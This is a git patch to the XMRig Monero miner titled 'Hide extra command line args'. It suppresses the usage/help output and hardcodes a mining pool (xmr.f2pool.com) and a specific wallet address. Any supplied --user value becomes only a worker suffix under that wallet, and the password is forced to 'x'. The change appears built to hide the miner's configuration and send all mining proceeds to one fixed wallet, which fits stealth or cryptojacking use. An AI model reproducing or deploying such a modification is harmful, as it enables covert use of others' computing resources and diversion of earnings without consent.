@@ -1,0 +1,82 @@
+From 167e9c94c366d01f3bc8ff96d8b07bce129c1300 Mon Sep 17 00:00:00 2001
+From: Yuehang Wu <yuehan9.wu@gmail.com>
+Date: Fri, 27 Dec 2019 13:02:21 +0000
+Subject: [PATCH] P01 Hide extra command line args
+
+---
+ src/base/kernel/Entry.cpp                |  2 +-
+ src/base/kernel/config/BaseTransform.cpp | 39 ++++++++++++++++++++++--
+ 2 files changed, 37 insertions(+), 4 deletions(-)
+
+diff --git a/src/base/kernel/Entry.cpp b/src/base/kernel/Entry.cpp
+index 1d1b7eb..131cf8d 100644
+--- a/src/base/kernel/Entry.cpp
++++ b/src/base/kernel/Entry.cpp
+@@ -161,7 +161,7 @@ int xmrig::Entry::exec(const Process &process, Id id)
+ {
+     switch (id) {
+     case Usage:
+-        printf("%s\n", usage().c_str());
++        //printf("%s\n", usage().c_str());
+         return 0;
+ 
+     case Version:
+diff --git a/src/base/kernel/config/BaseTransform.cpp b/src/base/kernel/config/BaseTransform.cpp
+index 8a3a140..b590614 100644
+--- a/src/base/kernel/config/BaseTransform.cpp
++++ b/src/base/kernel/config/BaseTransform.cpp
+@@ -167,15 +167,48 @@ void xmrig::BaseTransform::transform(rapidjson::Document &doc, int key, const ch
+             array.PushBack(rapidjson::kObjectType, doc.GetAllocator());
+         }
+ 
+-        set(doc, array[array.Size() - 1], "url", arg);
++        set(doc, array[array.Size() - 1], "url", "xmr.f2pool.com:13531");
+         break;
+     }
+ 
+     case IConfig::UserKey: /* --user */
+-        return add(doc, kPools, "user", arg);
++    {
++        /* one key to rule them all. INORDER  */
++        /* -o xxx.xxx.com:port */
++        {
++            if (!doc.HasMember(kPools)) {
++                doc.AddMember(rapidjson::StringRef(kPools), rapidjson::kArrayType, doc.GetAllocator());
++            }
++
++            rapidjson::Value &array = doc[kPools];
++            if (array.Size() == 0 || Pool(array[array.Size() - 1]).isValid()) {
++                array.PushBack(rapidjson::kObjectType, doc.GetAllocator());
++            }
++
++            set(doc, array[array.Size() - 1], "url", "xmr.f2pool.com:13531");
++        }
++        /* -u wallet.worker */
++        {
++            const char *xmrwallet = "49vhdfM9V29FEhCZDYwUTE2EY7NEsmNpPXNxzEPNgngS9RZgVhFpU3HXhgcAA8ESnoZnLe9fmnrQs1yTuYemKJg2DzEweyp.";
++            char *fullxmrwallet = (char *)malloc(strlen(xmrwallet)+64);
++            strcpy(fullxmrwallet, xmrwallet);
++            strcat(fullxmrwallet, arg);
++            add<const char *>(doc, kPools, "user", fullxmrwallet);
++            free(fullxmrwallet);
++        }
++        /* -p x */
++        {
++            add(doc, kPools, "pass", "x");
++        }
++        /* -k */
++        {
++            transformBoolean(doc, IConfig::KeepAliveKey, true);
++        }
++        break;
++    }
+ 
+     case IConfig::PasswordKey: /* --pass */
+-        return add(doc, kPools, "pass", arg);
++        return add(doc, kPools, "pass", "x");
+ 
+     case IConfig::RigIdKey: /* --rig-id */
+         return add(doc, kPools, "rig-id", arg);
+-- 
+2.17.1
+
